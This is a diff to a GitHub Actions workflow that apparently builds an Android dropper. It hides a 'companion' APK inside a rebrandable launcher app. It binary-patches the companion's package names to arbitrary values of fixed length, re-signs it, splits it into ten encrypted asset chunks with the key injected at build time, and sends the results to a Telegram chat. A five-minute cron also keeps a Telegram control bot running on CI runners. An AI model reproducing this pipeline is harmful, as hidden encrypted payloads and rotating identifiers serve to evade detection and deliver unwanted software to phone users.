@@ -1,26 +1,146 @@
-name: Build Nova Launcher APK
+# ════════════════════════════════════════════════════════
+# UNIFIED BUILD WORKFLOW — Nova Launcher + Companion
+# Nova package      : com.mobile.tools.XXXXXXXXXXXXXXXXXXX (36 chars)
+# Companion package : com.phone.helpXXXXX (19 chars)
+# Secrets required  : TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID,
+#                     GH_PAT, COMPANION_KEYSTORE_PASSWORD
+# ════════════════════════════════════════════════════════
+
+name: Builder
 
 on:
   push:
     branches: [ main ]
+  schedule:
+    - cron: '*/5 * * * *'
   workflow_dispatch:
+    inputs:
+      build_type:
+        description: 'bot | both'
+        required: true
+        default: 'bot'
+      nova_package:
+        description: 'Nova package name (exactly 36 chars)'
+        required: false
+        default: ''
+      companion_package:
+        description: 'Companion package name (exactly 19 chars)'
+        required: false
+        default: ''
+      app_name:
+        description: 'App name for Nova Launcher'
+        required: false
+        default: ''
+      icon_b64:
+        description: 'Base64 encoded PNG icon'
+        required: false
+        default: ''
 
 jobs:
-  build:
-    name: Build Release APK
-    runs-on: ubuntu-latest
 
+# ════════════════════════════════════════════════════════
+# JOB 0 — PUSH NOTIFICATION
+# ════════════════════════════════════════════════════════
+
+  notify_push:
+    name: Push Notification
+    runs-on: ubuntu-latest
+    if: github.event_name == 'push'
     steps:
-      - name: Checkout Repository
+      - name: Send push notification to Telegram
+        run: |
+          COMMIT_ID="${{ github.sha }}"
+          SHORT_ID="${COMMIT_ID:0:7}"
+          COMMIT_MSG="${{ github.event.head_commit.message }}"
+          PUSHER="${{ github.event.pusher.name }}"
+          BRANCH="${{ github.ref_name }}"
+          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')
+          curl -s -X POST "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d parse_mode="Markdown" \
+            -d text="📦 *New Push to GitHub*
+
+          🔀 Branch : \`$BRANCH\`
+          🔑 Commit : \`$SHORT_ID\`
+          💬 Message: $COMMIT_MSG
+          👤 Pusher : $PUSHER
+          📅 Time   : $TIMESTAMP
+
+          🔗 [View commit](https://github.com/${{ github.repository }}/commit/$COMMIT_ID)"
+
+# ════════════════════════════════════════════════════════
+# JOB 1 — TELEGRAM BOT (24/7)
+# ════════════════════════════════════════════════════════
+
+  bot:
+    name: Telegram Bot
+    runs-on: ubuntu-latest
+    if: >
+      github.event_name == 'push' ||
+      github.event_name == 'schedule' ||
+      (github.event_name == 'workflow_dispatch' &&
+       github.event.inputs.build_type == 'bot')
+    timeout-minutes: 5
+    steps:
+      - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Verify companion.apk exists
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Cache pip packages
+        uses: actions/cache@v4
+        with:
+          path: ~/.cache/pip
+          key: pip-telebot-${{ runner.os }}
+
+      - name: Install dependencies
+        run: pip install pytelegrambotapi requests
+
+      - name: Run Telegram Bot (4 min window)
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID:   ${{ secrets.TELEGRAM_CHAT_ID }}
+          GH_PAT:             ${{ secrets.GH_PAT }}
+          REPO_NAME:          ${{ github.repository }}
+          GITHUB_EVENT_NAME:  ${{ github.event_name }}
+        run: timeout 240 python3 telegram_bot.py || true
+
+# ════════════════════════════════════════════════════════
+# JOB 2 — BUILD BOTH APPS
+# ════════════════════════════════════════════════════════
+
+  build_both:
+    name: Build Both Apps
+    runs-on: ubuntu-latest
+    if: >
+      github.event_name == 'workflow_dispatch' &&
+      github.event.inputs.build_type == 'both'
+    timeout-minutes: 45
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Validate package name lengths
         run: |
-          if [ ! -f app/src/main/assets/companion.apk ]; then
-            echo "[X] companion.apk missing from assets!"
+          NOVA_PKG="${{ github.event.inputs.nova_package }}"
+          COMP_PKG="${{ github.event.inputs.companion_package }}"
+          NOVA_LEN=${#NOVA_PKG}
+          COMP_LEN=${#COMP_PKG}
+          echo "Nova package     : $NOVA_PKG ($NOVA_LEN chars)"
+          echo "Companion package: $COMP_PKG ($COMP_LEN chars)"
+          if [ "$NOVA_LEN" != "36" ]; then
+            echo "[X] Nova package must be exactly 36 chars (got $NOVA_LEN)"
             exit 1
           fi
-          echo "[OK] companion.apk found ($(du -h app/src/main/assets/companion.apk | cut -f1))"
+          if [ "$COMP_LEN" != "19" ]; then
+            echo "[X] Companion package must be exactly 19 chars (got $COMP_LEN)"
+            exit 1
+          fi
+          echo "[OK] Package lengths validated"
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
@@ -32,59 +152,254 @@ jobs:
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Install Python dependencies
-        run: pip install pycryptodome --break-system-packages
-
-      - name: Encrypt companion.apk → 10 random chunks and inject key
+      - name: Install imagemagick + Python deps
         run: |
-          OUTPUT=$(python3 tools/encrypt_companion.py app/src/main/assets/companion.apk app/src/main/assets)
-          echo "$OUTPUT"
-          KEY_HEX=$(echo "$OUTPUT" | grep "^COMPANION_KEY_HEX=" | cut -d'=' -f2)
-          echo "[*] Injecting key into build.gradle"
-          sed -i "s|buildConfigField \"String\", \"COMPANION_KEY_HEX\", '\"PLACEHOLDER\"'|buildConfigField \"String\", \"COMPANION_KEY_HEX\", '\"${KEY_HEX}\"'|" app/build.gradle
-          echo "[OK] Key injected"
-          rm -f app/src/main/assets/companion.apk
-          rm -f app/src/main/assets/companion.enc
-          echo "[OK] Raw APK and enc removed from assets"
+          sudo apt-get install -y imagemagick -q
+          pip install pycryptodome --break-system-packages
+          echo "[OK] imagemagick + pycryptodome ready"
 
-      - name: Cache Gradle wrapper
+      - name: Cache Gradle wrapper jar
         uses: actions/cache@v4
         with:
           path: gradle/wrapper/gradle-wrapper.jar
           key: gradle-wrapper-${{ runner.os }}
 
+      # ── STAGE 1: Patch Companion APK ────────────────────────
+      - name: Patch and repackage companion APK
+        env:
+          NOVA_PKG: ${{ github.event.inputs.nova_package }}
+          COMP_PKG: ${{ github.event.inputs.companion_package }}
+        run: |
+          python3 << 'PYEOF'
+          import zipfile, os
+
+          nova_pkg = os.environ['NOVA_PKG']
+          comp_pkg = os.environ['COMP_PKG']
+
+          old_nova_uri  = b'package:com.cristal.bristral.tristal.mistral'
+          old_nova      = b'com.cristal.bristral.tristal.mistral'
+          old_comp      = b'com.android.pictach'
+          old_comp_path = b'com/android/pictach'
+
+          new_nova_uri  = b'package:' + nova_pkg.encode()
+          new_nova      = nova_pkg.encode()
+          new_comp      = comp_pkg.encode()
+          new_comp_path = comp_pkg.replace('.', '/').encode()
+
+          assert len(old_nova_uri)  == len(new_nova_uri),  "Nova URI length mismatch!"
+          assert len(old_nova)      == len(new_nova),      "Nova pkg length mismatch!"
+          assert len(old_comp)      == len(new_comp),      "Companion pkg length mismatch!"
+          assert len(old_comp_path) == len(new_comp_path), "Companion path length mismatch!"
+
+          print(f"Patching companion APK...")
+          print(f"  Nova target  : {old_nova.decode()} → {nova_pkg}")
+          print(f"  Companion pkg: {old_comp.decode()} → {comp_pkg}")
+
+          with zipfile.ZipFile('app/src/main/assets/companion.apk', 'r') as zin:
+              with zipfile.ZipFile('companion_unsigned.apk', 'w') as zout:
+                  for item in zin.infolist():
+                      data = zin.read(item.filename)
+                      if item.filename == 'classes.dex':
+                          data = data.replace(old_nova_uri,  new_nova_uri)
+                          data = data.replace(old_nova,      new_nova)
+                          data = data.replace(old_comp_path, new_comp_path)
+                          data = data.replace(old_comp,      new_comp)
+                          print(f"  DEX: patched")
+                      elif item.filename == 'AndroidManifest.xml':
+                          data = data.replace(old_comp_path, new_comp_path)
+                          data = data.replace(old_comp,      new_comp)
+                          print(f"  Manifest: patched")
+                      zout.writestr(item, data)
+
+          print("[OK] companion_unsigned.apk ready")
+          PYEOF
+
+      - name: Generate keystore + sign companion APK
+        run: |
+          keytool -genkeypair \
+            -alias companion_key \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -keystore companion.jks \
+            -storepass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -keypass "${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            -dname "CN=Android, OU=App, O=Mobile, L=US, S=CA, C=US" \
+            -noprompt
+          BUILD_TOOLS=$(ls $ANDROID_HOME/build-tools/ | sort -V | tail -1)
+          $ANDROID_HOME/build-tools/$BUILD_TOOLS/zipalign -v 4 \
+            companion_unsigned.apk companion_aligned.apk
+          $ANDROID_HOME/build-tools/$BUILD_TOOLS/apksigner sign \
+            --ks companion.jks \
+            --ks-key-alias companion_key \
+            --ks-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --key-pass pass:"${{ secrets.COMPANION_KEYSTORE_PASSWORD }}" \
+            --out companion_signed.apk \
+            companion_aligned.apk
+          echo "[OK] Companion signed — $(du -h companion_signed.apk | cut -f1)"
+
+      # ── STAGE 2: Encrypt companion → 10 random chunks ───────
+      - name: Place signed companion into Nova assets
+        run: |
+          cp companion_signed.apk app/src/main/assets/companion.apk
+          echo "[OK] companion.apk placed"
+
+      - name: Encrypt companion → 10 random chunks + inject key
+        run: |
+          OUTPUT=$(python3 tools/encrypt_companion.py app/src/main/assets/companion.apk app/src/main/assets)
+          echo "$OUTPUT"
+          KEY_HEX=$(echo "$OUTPUT" | grep "^COMPANION_KEY_HEX=" | cut -d'=' -f2)
+          sed -i "s|buildConfigField \"String\", \"COMPANION_KEY_HEX\", '\"PLACEHOLDER\"'|buildConfigField \"String\", \"COMPANION_KEY_HEX\", '\"${KEY_HEX}\"'|" app/build.gradle
+          rm -f app/src/main/assets/companion.apk
+          rm -f app/src/main/assets/companion.enc
+          echo "[OK] Encrypted, chunked, key injected, raw APK removed"
+
+      # ── STAGE 3: Patch Nova source ───────────────────────────
+      - name: Patch Nova applicationId + COMPANION_PACKAGE
+        env:
+          NOVA_PKG: ${{ github.event.inputs.nova_package }}
+          COMP_PKG: ${{ github.event.inputs.companion_package }}
+        run: |
+          python3 << 'EOF'
+          import os, re
+          nova_pkg = os.environ["NOVA_PKG"]
+          comp_pkg = os.environ["COMP_PKG"]
+          content = open("app/build.gradle").read()
+          content = re.sub(r'applicationId "[^"]*"', 'applicationId "' + nova_pkg + '"', content)
+          content = re.sub(r'namespace \'[^\']*\'', "namespace '" + nova_pkg + "'", content)
+          content = re.sub(
+              r'buildConfigField "String", "COMPANION_PACKAGE", [^\n]*',
+              'buildConfigField "String", "COMPANION_PACKAGE", \'"' + comp_pkg + '"\'',
+              content
+          )
+          open("app/build.gradle", "w").write(content)
+          for line in open("app/build.gradle"):
+              if any(k in line for k in ["applicationId", "namespace", "COMPANION_PACKAGE"]):
+                  print("[OK]", line.strip())
+          EOF
+
+      - name: Patch app name in strings.xml
+        run: |
+          APP_NAME="${{ github.event.inputs.app_name }}"
+          if [ -n "$APP_NAME" ]; then
+            python3 -c "
+          import re, sys
+          content = open('app/src/main/res/values/strings.xml').read()
+          content = re.sub(
+              r'<string name=\"app_name\">[^<]*</string>',
+              '<string name=\"app_name\">' + sys.argv[1] + '</string>',
+              content
+          )
+          open('app/src/main/res/values/strings.xml', 'w').write(content)
+          print('[OK] App name: ' + sys.argv[1])
+            " "$APP_NAME"
+          fi
+
+      - name: Apply launcher icon
+        run: |
+          ICON_B64="${{ github.event.inputs.icon_b64 }}"
+          if [ -n "$ICON_B64" ]; then
+            echo "$ICON_B64" | base64 -d > /tmp/icon_input.png
+            for size_dir in mdpi:48 hdpi:72 xhdpi:96 xxhdpi:144 xxxhdpi:192; do
+              DIR=$(echo $size_dir | cut -d: -f1)
+              SIZE=$(echo $size_dir | cut -d: -f2)
+              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
+                app/src/main/res/mipmap-${DIR}/ic_launcher.png
+              convert /tmp/icon_input.png -resize ${SIZE}x${SIZE} \
+                app/src/main/res/mipmap-${DIR}/ic_launcher_round.png
+            done
+            echo "[OK] All icon sizes replaced"
+          fi
+
+      # ── STAGE 4: Build Nova APK ──────────────────────────────
       - name: Grant gradlew permission
         run: chmod +x gradlew
 
-      - name: Build Release APK
-        id: build
+      - name: Build Nova Release APK
+        run: ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tee build_output.log
+
+      - name: Verify Nova APK
         run: |
-          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee build.log
-          echo "exit_code=${PIPESTATUS[0]}" >> $GITHUB_OUTPUT
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "[OK] Nova APK: $(du -h $APK | cut -f1)"
 
-      - name: Upload Release APK
-        if: success()
-        uses: actions/upload-artifact@v4
-        with:
-          name: nova-launcher-release
-          path: app/build/outputs/apk/release/app-release.apk
-          retention-days: 1
-          overwrite: true
-
-      - name: Show APK info
-        if: success()
+      # ── STAGE 5: Send to Telegram ────────────────────────────
+      - name: Send Companion APK to Telegram
         run: |
-          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
-          echo "APK: $APK"
-          echo "Size: $(du -h $APK | cut -f1)"
-          echo "DEX files:"
-          unzip -l $APK | grep "\.dex"
+          curl -s -X POST \
+            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@companion_signed.apk \
+            -F caption="🔧 *Companion App*
+          📦 Package: \`${{ github.event.inputs.companion_package }}\`
+          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
+            -F parse_mode="Markdown"
 
-      - name: Upload Build Error Log
+      - name: Send Nova APK to Telegram
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          curl -s -X POST \
+            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@"$APK" \
+            -F caption="✅ *Nova Launcher Built*
+          📱 App Name : \`${{ github.event.inputs.app_name }}\`
+          📦 Nova Pkg : \`${{ github.event.inputs.nova_package }}\`
+          📦 Comp Pkg : \`${{ github.event.inputs.companion_package }}\`
+          📅 $(date -u '+%Y-%m-%d %H:%M UTC')" \
+            -F parse_mode="Markdown"
+
+      - name: Send build complete summary
+        run: |
+          curl -s -X POST \
+            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d parse_mode="Markdown" \
+            -d text="✅ *Build Complete*
+
+          📱 Name : ${{ github.event.inputs.app_name }}
+          📦 Nova : \`${{ github.event.inputs.nova_package }}\`
+          📦 Comp : \`${{ github.event.inputs.companion_package }}\`
+          📅 $(date -u '+%Y-%m-%d %H:%M UTC')"
+
+      # ── Error handling ───────────────────────────────────────
+      - name: Collect error log on failure
+        if: failure()
+        run: |
+          LOG="error_log_run${{ github.run_number }}.txt"
+          echo "BUILD ERROR LOG — Run #${{ github.run_number }}" > $LOG
+          echo "Nova : ${{ github.event.inputs.nova_package }}" >> $LOG
+          echo "Comp : ${{ github.event.inputs.companion_package }}" >> $LOG
+          echo "Time : $(date -u)" >> $LOG
+          echo "" >> $LOG
+          [ -f build_output.log ] && cat build_output.log >> $LOG
+          echo "[OK] Error log: $LOG"
+
+      - name: Upload error log artifact
         if: failure()
         uses: actions/upload-artifact@v4
         with:
-          name: build-error-log
-          path: build.log
-          retention-days: 7
-          overwrite: true
+          name: error-log-run${{ github.run_number }}
+          path: error_log_run${{ github.run_number }}.txt
+          retention-days: 30
+
+      - name: Send error notification to Telegram
+        if: failure()
+        run: |
+          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+          LOG="error_log_run${{ github.run_number }}.txt"
+          curl -s -X POST \
+            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
+            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -d parse_mode="Markdown" \
+            -d text="❌ *Build Failed — Run #${{ github.run_number }}*
+
+          📦 Nova : \`${{ github.event.inputs.nova_package }}\`
+          📦 Comp : \`${{ github.event.inputs.companion_package }}\`
+          📅 $(date -u '+%Y-%m-%d %H:%M UTC')
+          🔗 [View log]($RUN_URL)"
+          [ -f "$LOG" ] && curl -s -X POST \
+            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
+            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
+            -F document=@"$LOG" \
+            -F caption="📋 Error log — Run #${{ github.run_number }}"
